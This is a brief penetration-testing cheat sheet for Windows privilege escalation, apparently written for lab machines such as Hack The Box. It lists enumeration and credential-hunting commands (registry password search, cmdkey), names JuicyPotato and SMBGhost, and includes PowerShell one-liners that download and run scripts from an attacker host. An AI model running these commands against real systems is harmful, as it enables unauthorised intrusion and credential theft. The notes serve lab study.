# privesc

If there is SeImpersonate privilege here you can run the JuicyPotato exploit to get a system shell, and there might be some privileges that you can use if its an AD environment

```
whoami /priv
```

windows last patched march 2020 or before, you can try SMBGhost vulnerability

```
wmic qfe list
(https://github.com/danigargu/CVE-2020-0796)
```

```
reg query HKLM /f pass /t REG_SZ /s
cmdkey /list
```

Once you get a shell on the box, you can run Sherlock to check if you have any vulnerable exploits

```
iex(new-object net.webclient).downloadstring('http://10.10.14.28/shell.ps1')

# sometimes when powershell doesn't load properly, its worth to try this way
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.25/Sherlock.ps1') | PowerShell -Noprofile -
```

if you're on `meterpreter`, run the exploit suggester with both x86 meterpreter and x64 meterpreter.

```
# collection of payloads and powershell scripts
https://github.com/samratashok/nishang

# local windows exploit suggester that you can run in you linux machine
https://github.com/AonCyberLabs/Windows-Exploit-Suggester
# to run powershell script on the shell windows machine for exploits
https://github.com/rasta-mouse/Sherlock

# this can be used to get a meterpreter shell once you've got a normal shell
https://github.com/trustedsec/unicorn
```

```
https://0xdf.gitlab.io/2019/09/07/htb-bastion.html#privesc-to-administrator

mremoteng privesc by cracking passwords in the mremoteng xml file..
```
